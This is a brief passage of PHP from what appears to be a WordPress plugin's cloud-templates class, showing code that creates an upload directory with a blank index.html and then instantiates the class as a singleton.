				'url'	 => $wp_info['baseurl'] . '/' . $dir_name . '/'
			);

			// Create the upload dir if it doesn't exist.
			if ( ! file_exists( $dir_info['path'] ) ) {

				// Create the directory.
				mkdir( $dir_info['path'] );

				// Add an index file for security.
				file_put_contents( $dir_info['path'] . 'index.html', '' );
			}

			return $dir_info;
		}

	}
}

/**
*  Kicking this off by calling 'get_instance()' method
*/
$UABB_Cloud_Templates = UABB_Cloud_Templates::get_instance();
